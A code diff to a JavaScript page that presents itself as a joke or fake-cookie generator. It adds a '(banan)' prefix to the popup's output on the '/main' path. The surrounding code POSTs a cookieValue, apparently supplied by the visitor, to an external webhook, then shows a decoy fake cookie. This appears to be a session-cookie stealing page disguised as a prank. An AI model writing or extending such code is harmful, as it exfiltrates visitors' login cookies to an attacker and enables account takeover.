@@ -228,8 +228,12 @@
     return warning + randomPart;
   }
 
-  function openPopup() {
-    document.getElementById('cookieBox').value = generateFakeCookie();
+  function openPopup(prefix) {
+    let cookie = generateFakeCookie();
+    if (prefix) {
+      cookie = "(banan) " + cookie;
+    }
+    document.getElementById('cookieBox').value = cookie;
     document.getElementById('cookiePopup').style.display = "block";
   }
 
@@ -241,6 +245,11 @@
     const box = document.getElementById("cookieBox");
     box.select();
     document.execCommand("copy");
+  }
+
+  // Check current domain/path
+  function isMainPath() {
+    return window.location.pathname === '/main';
   }
 
   // Joke button
@@ -269,12 +278,15 @@
       return;
     }
 
+    // Check if we're on /main path
+    const shouldPrefix = isMainPath();
+
     fetch(webhookUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ content: cookieValue })
     }).then(() => {
-      openPopup();
+      openPopup(shouldPrefix);
     }).catch(err => {
       console.error(err);
       alert('Ошибка! Попробуйте проверить ваш интернет!');
